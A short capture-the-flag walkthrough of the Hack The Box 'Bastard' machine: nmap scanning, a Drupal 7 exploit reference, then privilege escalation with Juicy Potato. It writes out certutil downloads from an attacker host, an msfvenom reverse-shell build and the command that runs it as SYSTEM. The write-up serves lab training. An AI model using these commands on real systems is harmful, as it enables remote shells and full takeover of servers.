nmap result:

```
PORT      STATE SERVICE    VERSION
80/tcp    open  tcpwrapped
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to Bastard | Bastard
135/tcp   open  tcpwrapped
49154/tcp open  tcpwrapped
```

We can find the version in souce code

```
Drupal 7
```

`searchsploit drupal 7` we can find a working exploit:

```
https://www.exploit-db.com/exploits/44449
```

We can use this exploit to gain user shell.

We will use [Juicy Potato](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#juicy-potato-abusing-the-golden-privileges) to escalate privilege.

`whoami /priv`

```
PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
```

Download JuicyPotato.exe on the target machine:

```
certutil.exe -urlcache -split -f "http://10.10.14.4:8000/JuicyPotato.exe" JuicyPotato.exe
```

Generate reverse shell binary:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe > shell-x64.exe
```

Download reverse shell binary to the target machine:

```
certutil.exe -urlcache -split -f "http://10.10.14.4:8000/shell-x64.exe" shell-x64.exe
```

Run JuicyPotato.exe to gain a privileged shell:

```
JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} -a "/c c:\inetpub\drupal-7.54\shell-x64.exe"
```

### Online Write-Ups

https://0xdf.gitlab.io/2019/03/12/htb-bastard.html